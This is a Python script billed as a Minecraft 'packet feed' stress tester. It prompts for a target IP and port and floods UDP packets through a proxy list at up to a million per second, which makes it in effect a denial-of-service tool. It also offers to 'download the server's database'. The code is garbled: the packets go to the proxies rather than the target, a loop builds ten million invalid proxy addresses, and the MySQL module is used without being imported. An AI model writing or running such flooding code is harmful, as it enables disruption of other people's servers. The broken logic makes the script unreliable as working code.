import pyfiglet
import socket
import time
import psutil
import threading
import random
import os
import shutil

# Define constants
MAX_DURATION = 1000  # Maximum test duration in seconds
MAX_PACKETS_PER_SECOND = 1000000  # Maximum packets per second
MIN_PACKETS_PER_SECOND = 1000  # Minimum packets per second for stress testing
MIN_PACKET_SIZE = 1024  # Minimum packet size in bytes for stress testing
PROXY_TIMEOUT = 5  # Timeout for proxy connections in seconds

# Define a list of proxy IP addresses and ports
PROXIES = [
    ("192.0.2.1", 12345),
    ("192.0.2.2", 12345),
    # Add more proxies if available
    # For demonstration purposes, I'll add placeholder IP addresses
    ("192.0.2.3", 12345),
    ("192.0.2.4", 12345),
    ("192.0.2.5", 12345),
    ("192.0.2.6", 12345),
    ("192.0.2.7", 12345),
    ("192.0.2.8", 12345),
    ("192.0.2.9", 12345),
    ("192.0.2.10", 12345),
    # Add more proxies as needed
]

# Generate more proxy IP addresses
for i in range(11, 10000001):
    PROXIES.append((f"192.0.2.{i}", 12345))

def get_database():
    try:
        # Replace the following variables with the actual paths and database name
        database_path = "/path/to/your/database"
        backup_path = "/path/to/backup/folder"
        database_name = "your_database.db"

        # Create a backup folder if it doesn't exist
        if not os.path.exists(backup_path):
            os.makedirs(backup_path)

        # Copy the database file to the backup folder
        shutil.copy2(os.path.join(database_path, database_name), backup_path)
        print("Database backup created successfully.")
    except Exception as e:
        print(f"Error creating database backup: {e}")

def connect_to_database():
    try:
        # Update connection details according to your database configuration
        connection = mysql.connector.connect(
            host="localhost",
            user="username",
            password="password",
            database="minecraft"
        )
        print("Connected to database successfully!")
        return connection
    except Exception as e:
        print(f"Failed to connect to the database: {e}")
        return None

def execute_query(connection, query):
    try:
        cursor = connection.cursor()
        cursor.execute(query)
        result = cursor.fetchall()
        cursor.close()
        return result
    except Exception as e:
        print(f"Error executing query: {e}")
        return None

def fetch_player_data(connection):
    query = "SELECT * FROM players"
    result = execute_query(connection, query)
    if result:
        print("Player data:")
        for row in result:
            print(row)  # Adjust printing format based on your database schema
    else:
        print("Failed to fetch player data from the database.")

def send_packets(host, port, num_packets_per_second, duration, packet_size):
    try:
        packets_sent = 0
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(PROXY_TIMEOUT)
        while time.time() < end_time and packets_sent < num_packets_per_second * duration:
            proxy = random.choice(PROXIES)
            packet_data = b'A' * packet_size
            sock.sendto(packet_data, proxy)
            packets_sent += 1
            time.sleep(1.0 / num_packets_per_second)
        return packets_sent
    except (socket.error, socket.timeout) as e:
        print(f"Socket error: {e}")
        return -1
    except Exception as e:
        print(f"An unexpected error occurred while sending packets: {e}")
        return -1
    finally:
        sock.close()

def get_server_info():
    try:
        cpu_usage = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        memory_usage = memory.percent
        disk = psutil.disk_usage('/')
        disk_usage = disk.percent
        net = psutil.net_io_counters()
        network_usage = (net.bytes_sent, net.bytes_recv)
        return cpu_usage, memory_usage, disk_usage, network_usage
    except Exception as e:
        print(f"An unexpected error occurred while getting server info: {e}")
        return None, None, None, None

def print_help():
    print("Available commands:")
    print("/print cpu - Print CPU usage")
    print("/print memory - Print memory usage")
    print("/print packets - Print total packets sent")
    print("/overall send packets - Print overall packets sent during the test session")
    print("/getinfo - Get specifications of the physical server's PC")
    print("/get database - Download the server's database")
    print("/exit - Exit the program")

def loading_screen():
    try:
        while True:
            cpu_usage, memory_usage, _, _ = get_server_info()
            loading_bar_length = 20
            cpu_bar = "#" * int(cpu_usage * loading_bar_length / 100)
            memory_bar = "#" * int(memory_usage * loading_bar_length / 100)
            print(f"CPU Usage: {cpu_usage:5.1f}% [{cpu_bar:<{loading_bar_length}}] | "
                  f"Memory Usage: {memory_usage:5.1f}% [{memory_bar:<{loading_bar_length}}]", end="\r")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nExiting loading screen...")

def main():
    try:
        # Connect to the database
        connection = connect_to_database()

        # Display program name in ASCII art
        program_name = "MinecraftPacketFeed"
        ascii_art = pyfiglet.figlet_format(program_name)
        print(ascii_art)

        # Start the loading screen thread
        loading_thread = threading.Thread(target=loading_screen)
        loading_thread.daemon = True
        loading_thread.start()

        while True:
            # Get user input for target server and test parameters
            minecraft_host = input("Enter target IP address: ")
            minecraft_port = int(input("Enter target port number: "))
            duration = int(input("Enter test duration in seconds (max 1000): "))
            num_packets_per_second = int(input("Enter number of packets per second (max 1000000): "))
            packet_size = int(input("Enter packet size in bytes: "))

            duration = min(duration, MAX_DURATION)
            num_packets_per_second = min(num_packets_per_second, MAX_PACKETS_PER_SECOND)
            num_packets_per_second = max(num_packets_per_second, MIN_PACKETS_PER_SECOND)
            packet_size = max(packet_size, MIN_PACKET_SIZE)

            total_packets_sent = send_packets(minecraft_host, minecraft_port, num_packets_per_second, duration, packet_size)

            if total_packets_sent != -1:
                overall_packets_sent = total_packets_sent

                while True:
                    command = input("Enter command ('/help' for available commands): ").strip().lower()
                    if command == '/help':
                        print_help()
                    elif command == '/print cpu':
                        cpu_usage, _, _, _ = get_server_info()
                        print(f"CPU Usage: {cpu_usage}%")
                    elif command == '/print memory':
                        _, memory_usage, _, _ = get_server_info()
                        print(f"Memory Usage: {memory_usage}%")
                    elif command == '/print packets':
                        print(f"Total packets sent: {total_packets_sent}")
                    elif command == '/overall send packets':
                        print(f"Overall packets sent: {overall_packets_sent}")
                    elif command == '/getinfo':
                        cpu_usage, memory_usage, disk_usage, network_usage = get_server_info()
                        print(f"CPU Usage: {cpu_usage}%")
                        print(f"Memory Usage: {memory_usage}%")
                        print(f"Disk Usage: {disk_usage}%")
                        print(f"Network Usage: {network_usage}")
                    elif command == '/get database':
                        get_database()
                    elif command == '/exit':
                        print("Exiting program.")
                        return
                    else:
                        print("Invalid command. Type '/help' for available commands.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
    finally:
        if connection:
            connection.close()

if __name__ == "__main__":
    main()
